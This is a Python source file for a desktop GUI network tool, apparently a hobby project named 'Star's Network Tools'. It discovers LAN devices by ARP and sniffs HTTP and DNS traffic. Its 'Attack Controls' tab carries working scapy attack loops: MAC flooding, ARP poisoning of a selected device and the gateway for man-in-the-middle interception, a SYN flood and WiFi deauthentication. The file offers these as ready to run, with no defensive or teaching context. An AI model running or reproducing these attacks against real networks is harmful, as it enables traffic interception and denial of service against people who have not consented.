import customtkinter as ctk
from tkinter import messagebox, ttk
import ipaddress
import socket
import threading
import time
from queue import Queue
from scapy.all import ARP, DNS, Ether, IP, TCP, ICMP, RadioTap , Dot11, Dot11Deauth, srp, RandMAC, send, sendp, UDP, Raw, conf, sniff, DNSQR
from scapy.layers.http import HTTPRequest, HTTPResponse
import dpkt
import warnings
from collections import defaultdict
import datetime

# Suppress warnings
warnings.filterwarnings("ignore")
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class AdvancedNetworkTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Star's Network Tools")
        self.root.geometry("1200x800")
        
        # Traffic and attack control
        self.capture_active = False
        self.attack_active = False
        self.capture_thread = None
        self.attack_thread = None
        self.traffic_data = defaultdict(list)
        self.device_traffic = defaultdict(list)
        
        # Main layout
        self.main_frame = ctk.CTkFrame(root)
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # ===== TOP CONTROL PANEL ===== #
        control_frame = ctk.CTkFrame(self.main_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        # Network interface selection
        ctk.CTkLabel(control_frame, text="Interface:").pack(side="left", padx=5)
        self.iface_entry = ctk.CTkEntry(control_frame, width=150, placeholder_text="eth0/wlan0")
        self.iface_entry.pack(side="left", padx=5)
        self.iface_entry.insert(0, conf.iface)
        
        # Network scan range
        ctk.CTkLabel(control_frame, text="Network:").pack(side="left", padx=5)
        self.network_entry = ctk.CTkEntry(control_frame, width=150, placeholder_text="192.168.1.0/24")
        self.network_entry.pack(side="left", padx=5)
        
        # Capture filter
        ctk.CTkLabel(control_frame, text="Filter:").pack(side="left", padx=5)
        self.filter_entry = ctk.CTkEntry(control_frame, placeholder_text="host 192.168.1.100")
        self.filter_entry.pack(side="left", padx=5, fill="x", expand=True)
        
        # Control buttons
        self.scan_btn = ctk.CTkButton(
            control_frame, 
            text="Scan Network", 
            command=self.start_scan_thread
        )
        self.scan_btn.pack(side="left", padx=5)
        
        self.start_btn = ctk.CTkButton(
            control_frame, 
            text="Start Capture", 
            command=self.start_capture,
            fg_color="green"
        )
        self.start_btn.pack(side="left", padx=5)
        
        self.stop_btn = ctk.CTkButton(
            control_frame, 
            text="Stop Capture", 
            command=self.stop_capture,
            fg_color="red",
            state="disabled"
        )
        self.stop_btn.pack(side="left", padx=5)
        
        # ===== MAIN DISPLAY AREA ===== #
        display_frame = ctk.CTkFrame(self.main_frame)
        display_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Device list (left pane)
        self.device_frame = ctk.CTkFrame(display_frame, width=300)
        self.device_frame.pack(side="left", fill="y", padx=5)
        
        ctk.CTkLabel(self.device_frame, text="Network Devices", font=("Arial", 14)).pack(pady=5)
        self.device_tree = ttk.Treeview(
            self.device_frame, 
            columns=("IP", "MAC", "Hostname", "OS"), 
            show="headings"
        )
        self.device_tree.heading("IP", text="IP Address")
        self.device_tree.heading("MAC", text="MAC Address")
        self.device_tree.heading("Hostname", text="Hostname")
        self.device_tree.heading("OS", text="OS Guess")
        self.device_tree.pack(fill="both", expand=True)
        
        # Traffic analysis (right pane)
        self.traffic_frame = ctk.CTkFrame(display_frame)
        self.traffic_frame.pack(side="right", fill="both", expand=True, padx=5)
        
        # Notebook for multiple tabs
        self.notebook = ttk.Notebook(self.traffic_frame)
        self.notebook.pack(fill="both", expand=True)
        
        # Traffic tab
        self.traffic_tab = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.traffic_tab, text="HTTP Traffic")
        
        self.traffic_tree = ttk.Treeview(
            self.traffic_tab, 
            columns=("Time", "Source", "Destination", "Method", "URL", "Host"), 
            show="headings"
        )
        for col in ["Time", "Source", "Destination", "Method", "URL", "Host"]:
            self.traffic_tree.heading(col, text=col)
            self.traffic_tree.column(col, width=120 if col in ["Time", "Method"] else 200)
        self.traffic_tree.pack(fill="both", expand=True)
        
        # Attack tab
        self.attack_tab = ctk.CTkFrame(self.notebook)
        self.notebook.add(self.attack_tab, text="Attack Controls")
        
        # Attack buttons
        attack_btn_frame = ctk.CTkFrame(self.attack_tab)
        attack_btn_frame.pack(fill="x", pady=5)
        
        ctk.CTkLabel(attack_btn_frame, text="General Attacks:").pack(anchor="w")
        general_frame = ctk.CTkFrame(attack_btn_frame)
        general_frame.pack(fill="x", pady=5)
        
        ctk.CTkButton(
            general_frame,
            text="MAC Flood",
            command=self.start_mac_flood,
            fg_color="orange"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        ctk.CTkButton(
            general_frame,
            text="ARP Scan",
            command=self.start_arp_scan,
            fg_color="orange"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        ctk.CTkButton(
            general_frame,
            text="DNS Spoof",
            command=self.start_dns_spoof,
            fg_color="red"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        # Targeted attacks
        ctk.CTkLabel(attack_btn_frame, text="Targeted Attacks:").pack(anchor="w", pady=(10,0))
        target_frame = ctk.CTkFrame(attack_btn_frame)
        target_frame.pack(fill="x", pady=5)
        
        ctk.CTkButton(
            target_frame,
            text="ARP Poison",
            command=self.start_arp_poison,
            fg_color="orange"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        ctk.CTkButton(
            target_frame,
            text="SYN Flood",
            command=self.start_syn_flood,
            fg_color="red"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        ctk.CTkButton(
            target_frame,
            text="Deauth Attack",
            command=self.start_deauth,
            fg_color="purple"
        ).pack(side="left", padx=2, fill="x", expand=True)
        
        # Stop button
        self.stop_attack_btn = ctk.CTkButton(
            attack_btn_frame,
            text="⛔ Stop All Attacks",
            command=self.stop_all_attacks,
            fg_color="gray",
            state="disabled"
        )
        self.stop_attack_btn.pack(fill="x", pady=10)
        
        # Console log
        self.console_frame = ctk.CTkFrame(self.main_frame)
        self.console_frame.pack(fill="x", padx=5, pady=5)
        
        self.console = ctk.CTkTextbox(self.console_frame, height=150)
        self.console.pack(fill="both", expand=True)
        self.log("Tool initialized. Scan network or start capture to begin.")
        
        # Initialize treeview style
        self._init_treeview_style()
        
        # Bind events
        self.device_tree.bind("<<TreeviewSelect>>", self.show_device_traffic)
    
    def _init_treeview_style(self):
        style = ttk.Style()
        style.theme_use("default")
        style.configure("Treeview", 
                       background="#2a2d2e",
                       foreground="white",
                       rowheight=25,
                       fieldbackground="#2a2d2e",
                       bordercolor="#343638",
                       borderwidth=0)
        style.map('Treeview', background=[('selected', '#22559b')])
        style.configure("Treeview.Heading",
                        background="#3b8ed0",
                        foreground="white",
                        relief="flat")
    
    # ===== CORE FUNCTIONS ===== #
    def start_scan_thread(self):
        """Start network scanning in background thread"""
        network_range = self.network_entry.get()
        try:
            ipaddress.ip_network(network_range, strict=False)
            threading.Thread(
                target=self.scan_network, 
                args=(network_range, 2),  # Default 2 second timeout
                daemon=True
            ).start()
            self.log(f"Scanning network: {network_range}")
        except ValueError:
            messagebox.showerror("Error", "Invalid network range")
    
    def scan_network(self, network_range, timeout):
        """Perform ARP scan to discover devices"""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=timeout, verbose=0)
            for _, recv in ans:
                ip = recv.psrc
                mac = recv.hwsrc
                try:
                    hostname = socket.getfqdn(ip)
                    os_guess = self._guess_os(recv)
                except:
                    hostname = "Unknown"
                    os_guess = "Unknown"
                
                self.device_tree.insert("", "end", values=(ip, mac, hostname, os_guess))
                self.log(f"Found device: {ip} ({mac})")
        except Exception as e:
            self.log(f"Scan error: {str(e)}")
    
    def _guess_os(self, pkt):
        """Simple OS fingerprinting based on TTL"""
        if IP in pkt:
            ttl = pkt[IP].ttl
            if ttl <= 64: return "Linux/Unix"
            elif ttl <= 128: return "Windows"
        return "Unknown"
    
    def start_capture(self):
        """Start network traffic capture"""
        iface = self.iface_entry.get()
        bpf_filter = self.filter_entry.get()
        
        if not iface:
            messagebox.showerror("Error", "Please specify network interface")
            return
            
        self.capture_active = True
        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.log(f"Starting capture on {iface} with filter: {bpf_filter}")
        
        self.capture_thread = threading.Thread(
            target=self._capture_traffic,
            args=(iface, bpf_filter),
            daemon=True
        )
        self.capture_thread.start()
    
    def stop_capture(self):
        """Stop network capture"""
        self.capture_active = False
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.log("Traffic capture stopped")
    
    def _capture_traffic(self, iface, bpf_filter):
        """Sniff network traffic and process packets"""
        try:
            sniff(
                iface=iface,
                filter=bpf_filter,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: not self.capture_active
            )
        except Exception as e:
            self.log(f"Capture error: {str(e)}")
    
    def _process_packet(self, packet):
        """Process each captured packet"""
        try:
            # Extract basic info
            if IP in packet:
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                timestamp = datetime.datetime.fromtimestamp(packet.time).strftime('%H:%M:%S')
                
                # Process HTTP traffic
                if packet.haslayer(TCP) and packet.haslayer(Raw):
                    self._process_http(packet, src_ip, dst_ip, timestamp)
                
                # Process DNS queries
                if packet.haslayer(DNS):
                    self._process_dns(packet, src_ip, timestamp)
        except Exception as e:
            pass
    
    def _process_http(self, packet, src_ip, dst_ip, timestamp):
        """Extract HTTP requests/responses"""
        try:
            # HTTP Request
            if packet[TCP].dport == 80 and packet.haslayer(HTTPRequest):
                http = packet[HTTPRequest]
                host = http.Host.decode() if http.Host else ""
                path = http.Path.decode() if http.Path else "/"
                method = http.Method.decode() if http.Method else "GET"
                
                entry = (timestamp, src_ip, dst_ip, method, path, host)
                self.device_traffic[src_ip].append(entry)
                self._update_traffic_view()
            
            # HTTP Response
            elif packet[TCP].sport == 80 and packet.haslayer(HTTPResponse):
                pass  # Could extract response codes here
            
        except Exception as e:
            pass
    
    def _process_dns(self, packet, src_ip, timestamp):
        """Extract DNS queries"""
        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:  # DNS query
            query = packet[DNSQR].qname.decode('utf-8', 'ignore')
            self.log(f"DNS Query from {src_ip}: {query}")
    
    def show_device_traffic(self, event):
        """Show traffic for selected device"""
        selected = self.device_tree.focus()
        if selected:
            ip = self.device_tree.item(selected)["values"][0]
            self._update_traffic_view(ip)
    
    def _update_traffic_view(self, ip=None):
        """Update traffic display for specific IP or all traffic"""
        self.traffic_tree.delete(*self.traffic_tree.get_children())
        
        if ip:
            data = self.device_traffic.get(ip, [])
        else:
            data = []
            for traffic in self.device_traffic.values():
                data.extend(traffic)
        
        for entry in sorted(data, key=lambda x: x[0], reverse=True)[:100]:  # Show most recent 100 entries
            self.traffic_tree.insert("", "end", values=entry)
    
    # ===== ATTACK FUNCTIONS ===== #
    def start_mac_flood(self):
        """Flood switch with random MAC addresses"""
        self._start_attack("MAC Flood", self._mac_flood_loop)
    
    def _mac_flood_loop(self):
        while self.attack_active:
            sendp(Ether(src=RandMAC(), dst=RandMAC())/ARP(op=2, psrc="0.0.0.0"), verbose=0)
            time.sleep(0.1)
    
    def start_arp_scan(self):
        """Scan network with ARP requests"""
        self._start_attack("ARP Scan", self._arp_scan)
    
    def _arp_scan(self):
        network = self.network_entry.get()
        if network:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=0)
            for _, recv in ans:
                self.log(f"Found: {recv.psrc} ({recv.hwsrc})")
    
    def start_dns_spoof(self):
        """Simulate DNS spoofing attack"""
        self.log("⚠️ DNS Spoofing requires ARP poisoning first (see code comments)")
    
    def start_arp_poison(self):
        """Start ARP poisoning (MITM) attack"""
        selected = self._get_selected_device()
        if selected:
            ip = selected["ip"]
            self._start_attack(f"ARP Poison on {ip}", lambda: self._arp_poison_loop(ip))
    
    def _arp_poison_loop(self, target_ip):
        gateway = "192.168.1.1"  # Change to your gateway IP
        while self.attack_active:
            send(ARP(op=2, pdst=target_ip, psrc=gateway), verbose=0)
            send(ARP(op=2, pdst=gateway, psrc=target_ip), verbose=0)
            time.sleep(2)
    
    def start_syn_flood(self):
        """Start SYN flood attack"""
        selected = self._get_selected_device()
        if selected:
            ip = selected["ip"]
            self._start_attack(f"SYN Flood on {ip}", lambda: self._syn_flood_loop(ip))
    
    def _syn_flood_loop(self, target_ip):
        while self.attack_active:
            send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)
            time.sleep(0.01)
    
    def start_deauth(self):
        """Start WiFi deauthentication attack"""
        selected = self._get_selected_device()
        if selected:
            mac = selected["mac"]
            self._start_attack(f"Deauth on {mac}", lambda: self._deauth_loop(mac))
    
    def _deauth_loop(self, target_mac):
        while self.attack_active:
            sendp(
                RadioTap()/
                Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")/
                Dot11Deauth(),
                iface=self.iface_entry.get(),
                verbose=0
            )
            time.sleep(0.1)
    
    def _get_selected_device(self):
        """Get currently selected device info"""
        selected = self.device_tree.focus()
        if selected:
            values = self.device_tree.item(selected)["values"]
            return {"ip": values[0], "mac": values[1]}
        messagebox.showwarning("Warning", "No device selected")
        return None
    
    def _start_attack(self, name, attack_func):
        """Start an attack in background thread"""
        if self.attack_active:
            messagebox.showwarning("Warning", "Another attack is already running")
            return
        
        self.attack_active = True
        self.stop_attack_btn.configure(state="normal")
        self.log(f"🚀 Starting {name}...")
        
        self.attack_thread = threading.Thread(
            target=attack_func,
            daemon=True
        )
        self.attack_thread.start()
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        self.attack_active = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1)
        self.stop_attack_btn.configure(state="disabled")
        self.log("🛑 All attacks stopped")
    
    # ===== UTILITY FUNCTIONS ===== #
    def log(self, message):
        """Add message to console with timestamp"""
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        self.console.insert("end", f"[{timestamp}] {message}\n")
        self.console.see("end")
    
    def on_close(self):
        """Cleanup on window close"""
        self.capture_active = False
        self.attack_active = False
        if self.capture_thread and self.capture_thread.is_alive():
            self.capture_thread.join(timeout=1)
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=1)
        self.root.destroy()

if __name__ == "__main__":
    root = ctk.CTk()
    app = AdvancedNetworkTool(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()